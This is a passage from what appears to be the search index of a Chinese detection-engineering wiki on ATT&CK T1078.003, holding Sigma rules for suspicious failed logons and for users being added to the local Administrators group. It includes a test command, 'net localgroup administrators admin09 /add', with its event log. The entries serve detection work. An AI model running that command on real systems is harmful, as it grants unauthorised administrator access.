https://attack.mitre.org/techniques/T1078/003","title":"T1078-003-win-\u53ef\u7591\u7684\u5931\u8d25\u767b\u5f55\u884c\u4e3a"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#t1078-003-win-","text":"","title":"T1078-003-win-\u53ef\u7591\u7684\u5931\u8d25\u767b\u5f55\u884c\u4e3a"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7a83\u53d6\u7684\u51ed\u636e\u7ed5\u8fc7\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u5404\u79cd\u8d44\u6e90\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u751a\u81f3\u53ef\u7528\u4e8e\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u548c\u5916\u90e8\u53ef\u7528\u670d\u52a1\uff08\u5982VPN\u3001Outlook Web Access\u548c\u8fdc\u7a0b\u684c\u9762\uff09\u7684\u6301\u4e45\u8bbf\u95ee\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u901a\u8fc7\u7a83\u53d6\u7684\u51ed\u636e\u83b7\u5f97\u7279\u5b9a\u7cfb\u7edf\u7684\u66f4\u591a\u6743\u9650\u6216\u7f51\u7edc\u53d7\u9650\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0d\u5c06\u6076\u610f\u8f6f\u4ef6\u6216\u5de5\u5177\u4e0e\u8fd9\u4e9b\u51ed\u636e\u63d0\u4f9b\u7684\u5408\u6cd5\u8bbf\u95ee\u7ed3\u5408\u4f7f\u7528\uff0c\u8fd9\u6837\u5c31\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u4eec\u7684\u5b58\u5728\u3002 \u9ed8\u8ba4\u8d26\u53f7\u5e76\u4e0d\u9650\u4e8e\u5ba2\u6237\u7aef\u673a\u5668\u4e0a\u7684\u8bbf\u5ba2\u548c\u7ba1\u7406\u5458\uff0c\u5b83\u4eec\u8fd8\u5305\u62ec\u4e3a\u8bbe\u5907\uff08\u5982\u7f51\u7edc\u8bbe\u5907\u548c\u8ba1\u7b97\u673a\u5e94\u7528\uff09\u9884\u8bbe\u7684\u8d26\u53f7\uff0c\u65e0\u8bba\u8fd9\u4e9b\u8bbe\u5907\u662f\u5185\u90e8\u7684\u3001\u5f00\u6e90\u7684\u8fd8\u662fCOTS\u3002\u5982\u679c\u8bbe\u5907\u9884\u8bbe\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\u7ec4\u5408\u800c\u4e14\u5b89\u88c5\u540e\u4e0d\u66f4\u6539\uff0c\u5c06\u4f1a\u5bf9\u7ec4\u7ec7\u6784\u6210\u4e25\u91cd\u5a01\u80c1\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u6210\u4e3a\u653b\u51fb\u8005\u7684\u76ee\u6807\u3002\u540c\u7406\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4f1a\u5229\u7528\u516c\u5f00\u62ab\u9732\u7684\u79c1\u94a5\u6216\u76d7\u53d6\u7684\u79c1\u94a5\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5408\u6cd5\u5730\u8fde\u63a5\u5230\u8fdc\u7a0b\u73af\u5883\u3002 \u6211\u4eec\u9700\u8981\u5173\u6ce8\u8de8\u7cfb\u7edf\u7f51\u7edc\u7684\u8d26\u53f7\u8bbf\u95ee\u3001\u51ed\u636e\u548c\u6743\u9650\u7684\u91cd\u53e0\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u4e5f\u8bb8\u80fd\u591f\u8de8\u8d26\u53f7\u548c\u7cfb\u7edf\u5207\u6362\u4ee5\u83b7\u5f97\u8f83\u9ad8\u7684\u8bbf\u95ee\u7ea7\u522b\uff08\u57df\u6216\u4f01\u4e1a\u7ba1\u7406\u5458\uff09\uff0c\u4ece\u800c\u7ed5\u8fc7\u4f01\u4e1a\u5185\u8bbe\u7f6e\u7684\u8bbf\u95ee\u63a7\u5236\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_1","text":"windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_3","text":"\u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_4","text":"windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7 / win2008+\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#sigma","text":"title: \u5e10\u6237\u7be1\u6539-\u53ef\u7591\u7684\u5931\u8d25\u767b\u5f55\u539f\u56e0 description: \u6b64\u65b9\u6cd5\u5bf9\u5931\u8d25\u7684\u767b\u5f55\u4f7f\u7528\u4e0d\u5e38\u89c1\u7684\u9519\u8bef\u4ee3\u7801\u6765\u786e\u5b9a\u53ef\u7591\u6d3b\u52a8\u5e76\u7be1\u6539\u5df2\u7981\u7528\u6216\u53d7\u67d0\u79cd\u65b9\u5f0f\u9650\u5236\u7684\u5e10\u6237\u3002 author: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1) date: 2020/06/09 references: - https://twitter.com/SBousseaden/status/1101431884540710913 tags: - attack.persistence - attack.privilege_escalation - attack.t1078 logsource: product: windows service: security detection: selection: EventID: - 4625 #\u666e\u901a\u8d26\u6237\u767b\u5f55\u5931\u8d25 - 4776 #\u57df\u8d26\u6237\u767b\u5f55\u5931\u8d25 Status: - '0xC0000072' # \u7528\u6237\u767b\u5f55\u5230\u5e10\u6237\u5df2\u88ab\u7ba1\u7406\u5458\u7981\u7528 - '0xC000006F' # \u7528\u6237\u5728\u6388\u6743\u65f6\u95f4\u4e4b\u5916\u767b\u5f55 - '0xC0000070' # \u7528\u6237\u4ece\u672a\u7ecf\u6388\u6743\u7684\u5de5\u4f5c\u7ad9\u767b\u5f55 - '0xC0000413' # \u767b\u5f55\u5931\u8d25\uff1a\u60a8\u767b\u5f55\u7684\u8ba1\u7b97\u673a\u53d7\u5230\u8eab\u4efd\u9a8c\u8bc1\u9632\u706b\u5899\u7684\u4fdd\u62a4\u3002 \u6307\u5b9a\u7684\u5e10\u6237\u4e0d\u5141\u8bb8\u5bf9\u8ba1\u7b97\u673a\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1 - '0xC000018C' # \u767b\u5f55\u8bf7\u6c42\u5931\u8d25\uff0c\u56e0\u4e3a\u4e3b\u57df\u548c\u53ef\u4fe1\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\u5173\u7cfb\u5931\u8d25 - '0xC000015B' # \u7528\u6237\u5c1a\u672a\u5728\u6b64\u8ba1\u7b97\u673a\u4e0a\u88ab\u6388\u4e88\u8bf7\u6c42\u7684\u767b\u5f55\u7c7b\u578b\uff08\u4e5f\u79f0\u4e3a\u767b\u5f55\u6743\u9650\uff09 condition: selection falsepositives: - \u4f7f\u7528\u7981\u7528\u5e10\u6237\u7684\u7528\u6237 level: high \u6ce8\u610f\uff1a\u6b64\u89c4\u5219\u4e3b\u8981\u662f\u9488\u5bf9\u7528\u6237\u8d26\u6237\u767b\u5f55\u5931\u8d25\u884c\u4e3a\u72b6\u6001\u7801\u8fdb\u884c\u5206\u6790\u3002","title":"sigma\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_7","text":"MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/","text":"T1078-003-windows-\u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ec4 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7a83\u53d6\u7684\u51ed\u636e\u7ed5\u8fc7\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u5404\u79cd\u8d44\u6e90\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u751a\u81f3\u53ef\u7528\u4e8e\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u548c\u5916\u90e8\u53ef\u7528\u670d\u52a1\uff08\u5982VPN\u3001Outlook Web Access\u548c\u8fdc\u7a0b\u684c\u9762\uff09\u7684\u6301\u4e45\u8bbf\u95ee\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u901a\u8fc7\u7a83\u53d6\u7684\u51ed\u636e\u83b7\u5f97\u7279\u5b9a\u7cfb\u7edf\u7684\u66f4\u591a\u6743\u9650\u6216\u7f51\u7edc\u53d7\u9650\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0d\u5c06\u6076\u610f\u8f6f\u4ef6\u6216\u5de5\u5177\u4e0e\u8fd9\u4e9b\u51ed\u636e\u63d0\u4f9b\u7684\u5408\u6cd5\u8bbf\u95ee\u7ed3\u5408\u4f7f\u7528\uff0c\u8fd9\u6837\u5c31\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u4eec\u7684\u5b58\u5728\u3002 \u9ed8\u8ba4\u8d26\u53f7\u5e76\u4e0d\u9650\u4e8e\u5ba2\u6237\u7aef\u673a\u5668\u4e0a\u7684\u8bbf\u5ba2\u548c\u7ba1\u7406\u5458\uff0c\u5b83\u4eec\u8fd8\u5305\u62ec\u4e3a\u8bbe\u5907\uff08\u5982\u7f51\u7edc\u8bbe\u5907\u548c\u8ba1\u7b97\u673a\u5e94\u7528\uff09\u9884\u8bbe\u7684\u8d26\u53f7\uff0c\u65e0\u8bba\u8fd9\u4e9b\u8bbe\u5907\u662f\u5185\u90e8\u7684\u3001\u5f00\u6e90\u7684\u8fd8\u662fCOTS\u3002\u5982\u679c\u8bbe\u5907\u9884\u8bbe\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\u7ec4\u5408\u800c\u4e14\u5b89\u88c5\u540e\u4e0d\u66f4\u6539\uff0c\u5c06\u4f1a\u5bf9\u7ec4\u7ec7\u6784\u6210\u4e25\u91cd\u5a01\u80c1\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u6210\u4e3a\u653b\u51fb\u8005\u7684\u76ee\u6807\u3002\u540c\u7406\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4f1a\u5229\u7528\u516c\u5f00\u62ab\u9732\u7684\u79c1\u94a5\u6216\u76d7\u53d6\u7684\u79c1\u94a5\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5408\u6cd5\u5730\u8fde\u63a5\u5230\u8fdc\u7a0b\u73af\u5883\u3002 \u6211\u4eec\u9700\u8981\u5173\u6ce8\u8de8\u7cfb\u7edf\u7f51\u7edc\u7684\u8d26\u53f7\u8bbf\u95ee\u3001\u51ed\u636e\u548c\u6743\u9650\u7684\u91cd\u53e0\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u4e5f\u8bb8\u80fd\u591f\u8de8\u8d26\u53f7\u548c\u7cfb\u7edf\u5207\u6362\u4ee5\u83b7\u5f97\u8f83\u9ad8\u7684\u8bbf\u95ee\u7ea7\u522b\uff08\u57df\u6216\u4f01\u4e1a\u7ba1\u7406\u5458\uff09\uff0c\u4ece\u800c\u7ed5\u8fc7\u4f01\u4e1a\u5185\u8bbe\u7f6e\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ba1\u7406\u7ec4 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32>net localgroup administrators admin09 /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u6d4b\u8bd5\u7559\u75d5 \u5df2\u5411\u542f\u7528\u4e86\u5b89\u5168\u6027\u7684\u672c\u5730\u7ec4\u4e2d\u6dfb\u52a0\u67d0\u4e2a\u6210\u5458\u3002 \u4e3b\u9898: \u5b89\u5168 ID: 12306Br0-PC\\12306Br0 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x51893 \u6210\u5458: \u5b89\u5168 ID: 12306Br0-PC\\admin09 \u5e10\u6237\u540d: - \u7ec4: \u5b89\u5168 ID: BUILTIN\\Administrators \u7ec4\u540d: Administrators \u7ec4\u57df: Builtin \u9644\u52a0\u4fe1\u606f: \u7279\u6743: - \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ec4 description: \u6b64\u89c4\u5219\u89e6\u53d1\u6dfb\u52a0\u5230\u672c\u5730Administrators\u7ec4\u7684\u7528\u6237\u5e10\u6237\uff0c\u8fd9\u53ef\u80fd\u662f\u5408\u6cd5\u6d3b\u52a8\u6216\u7279\u6743\u5347\u7ea7\u6d3b\u52a8\u7684\u6807\u5fd7\u3002 status: stable author: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1) date: 2020/06/08 tags: - attack.privilege_escalation - attack.t1078 logsource: product: windows service: security detection: selection: EventID: - \u201c4732\u201d #\u4e00\u540d\u7528\u6237\u88ab\u6dfb\u52a0\u5230\u5b89\u5168\u672c\u5730\u7ec4 - \u201d4720\u201c # \u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237 selection_group1: GroupName: 'Administrators' #\u7ec4\u540d filter: SubjectUserName: '*$' condition: selection and (1 of selection_group*) and not filter falsepositives: - \u5408\u6cd5\u7528\u6237\u6d3b\u52a8 level: medium \u5efa\u8bae \u68c0\u6d4b\u65b9\u6cd5\u9664\u4e864732\u4e4b\u5916\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc74720\u6765\u8fdb\u884c\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003","title":"T1078-003-windows-\u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ec4"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#t1078-003-windows-","text":"","title":"T1078-003-windows-\u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ec4"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7a83\u53d6\u7684\u51ed\u636e\u7ed5\u8fc7\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u5404\u79cd\u8d44\u6e90\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u751a\u81f3\u53ef\u7528\u4e8e\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u548c\u5916\u90e8\u53ef\u7528\u670d\u52a1\uff08\u5982VPN\u3001Outlook Web Access\u548c\u8fdc\u7a0b\u684c\u9762\uff09\u7684\u6301\u4e45\u8bbf\u95ee\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u901a\u8fc7\u7a83\u53d6\u7684\u51ed\u636e\u83b7\u5f97\u7279\u5b9a\u7cfb\u7edf\u7684\u66f4\u591a\u6743\u9650\u6216\u7f51\u7edc\u53d7\u9650\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0d\u5c06\u6076\u610f\u8f6f\u4ef6\u6216\u5de5\u5177\u4e0e\u8fd9\u4e9b\u51ed\u636e\u63d0\u4f9b\u7684\u5408\u6cd5\u8bbf\u95ee\u7ed3\u5408\u4f7f\u7528\uff0c\u8fd9\u6837\u5c31\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u4eec\u7684\u5b58\u5728\u3002 \u9ed8\u8ba4\u8d26\u53f7\u5e76\u4e0d\u9650\u4e8e\u5ba2\u6237\u7aef\u673a\u5668\u4e0a\u7684\u8bbf\u5ba2\u548c\u7ba1\u7406\u5458\uff0c\u5b83\u4eec\u8fd8\u5305\u62ec\u4e3a\u8bbe\u5907\uff08\u5982\u7f51\u7edc\u8bbe\u5907\u548c\u8ba1\u7b97\u673a\u5e94\u7528\uff09\u9884\u8bbe\u7684\u8d26\u53f7\uff0c\u65e0\u8bba\u8fd9\u4e9b\u8bbe\u5907\u662f\u5185\u90e8\u7684\u3001\u5f00\u6e90\u7684\u8fd8\u662fCOTS\u3002\u5982\u679c\u8bbe\u5907\u9884\u8bbe\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\u7ec4\u5408\u800c\u4e14\u5b89\u88c5\u540e\u4e0d\u66f4\u6539\uff0c\u5c06\u4f1a\u5bf9\u7ec4\u7ec7\u6784\u6210\u4e25\u91cd\u5a01\u80c1\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u6210\u4e3a\u653b\u51fb\u8005\u7684\u76ee\u6807\u3002\u540c\u7406\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4f1a\u5229\u7528\u516c\u5f00\u62ab\u9732\u7684\u79c1\u94a5\u6216\u76d7\u53d6\u7684\u79c1\u94a5\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5408\u6cd5\u5730\u8fde\u63a5\u5230\u8fdc\u7a0b\u73af\u5883\u3002 \u6211\u4eec\u9700\u8981\u5173\u6ce8\u8de8\u7cfb\u7edf\u7f51\u7edc\u7684\u8d26\u53f7\u8bbf\u95ee\u3001\u51ed\u636e\u548c\u6743\u9650\u7684\u91cd\u53e0\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u4e5f\u8bb8\u80fd\u591f\u8de8\u8d26\u53f7\u548c\u7cfb\u7edf\u5207\u6362\u4ee5\u83b7\u5f97\u8f83\u9ad8\u7684\u8bbf\u95ee\u7ea7\u522b\uff08\u57df\u6216\u4f01\u4e1a\u7ba1\u7406\u5458\uff09\uff0c\u4ece\u800c\u7ed5\u8fc7\u4f01\u4e1a\u5185\u8bbe\u7f6e\u7684\u8bbf\u95ee\u63a7\u5236\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_1","text":"\u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ba1\u7406\u7ec4","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_2","text":"windows 